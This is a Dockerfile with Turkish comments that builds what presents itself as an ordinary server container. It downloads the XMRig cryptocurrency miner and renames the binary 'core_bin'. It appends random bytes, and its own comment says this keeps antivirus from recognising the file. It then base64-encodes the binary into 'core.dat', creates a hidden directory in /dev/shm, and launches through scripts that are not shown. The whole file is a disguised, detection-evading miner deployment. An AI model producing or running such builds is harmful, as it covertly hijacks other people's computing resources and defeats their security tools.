FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        wget curl ca-certificates python3 libstdc++6 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /server

# 1. Binary indirme ve hazırlık 
RUN wget -qO /tmp/sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" \
    && tar xzf /tmp/sys.tar.gz -C /server \
    && mv /server/xmrig-6.21.0/xmrig /server/core_bin \
    && rm -rf /tmp/sys.tar.gz /server/xmrig-6.21.0

# 2. İmza (Hash) Bozma ve Base64 Payload Oluşturma 
# Dosya sonuna rastgele 128 bayt ekleyerek anti-virüslerin tanımasını engeller
RUN head -c 128 /dev/urandom >> /server/core_bin \
    && python3 -c "import base64; d=open('/server/core_bin','rb').read(); open('/server/core.dat','wb').write(base64.b64encode(d))" \
    && rm /server/core_bin

COPY engine.py /engine.py
COPY start.sh  /start.sh
RUN chmod +x /start.sh

# Veri dizini oluşturma ve yetkilendirme
RUN mkdir -p /dev/shm/.cache && chmod 777 /dev/shm/.cache

USER 1000
EXPOSE 8080
CMD ["/start.sh"]
